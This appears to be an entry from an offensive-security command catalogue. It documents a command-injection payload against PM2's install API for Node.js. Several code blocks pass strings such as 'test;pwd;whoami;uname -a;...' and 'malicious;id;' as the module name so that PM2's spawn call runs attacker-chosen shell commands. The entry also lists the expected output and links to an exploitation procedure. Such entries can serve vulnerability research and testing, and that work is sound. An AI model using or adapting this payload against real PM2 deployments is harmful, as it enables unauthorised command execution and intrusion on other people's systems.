---
data: >-
  pm2.install('test;pwd;whoami;uname -a;ls -l ~/playground/Node;', {},
  function(err, apps) { /* handle */ })
tags:
  - exploit
  - injection
type: command
output: Triggers the vulnerable spawn call leading to command execution
executor: javascript
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.425Z'
id: 2969896b-4128-4a9c-a9c2-f929712d3bf9
verified: false
validated: true
submitted: true
---
# pm2-install-payload

## Command

```javascript
pm2.install('test;pwd;whoami;uname -a;ls -l ~/playground/Node;', {}, function(err, apps) { /* handle */ })
```

## Description

Calls PM2's install API with an injected payload, exploiting the unsanitized module_name to execute shell commands via spawn.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{}` | Empty options object | No |
| `payload` | Injected string: 'test;pwd;whoami;uname -a;ls -l ~/playground/Node;' | Yes |

## Examples

### Basic Usage

```javascript
pm2.install(payload, {}, callback);
```

### Advanced Usage

```javascript
pm2.install('malicious;id;', { cwd: '/tmp' }, callback);
```

## Expected Output

Installation logs, executed command outputs (pwd, whoami, uname -a, ls -l), and NPM errors; callback receives err/apps.

## Related

- [[commands/pm2-install-malicious-module]]
- [[procedures/Exploit-PM2-API-Command-Injection]]
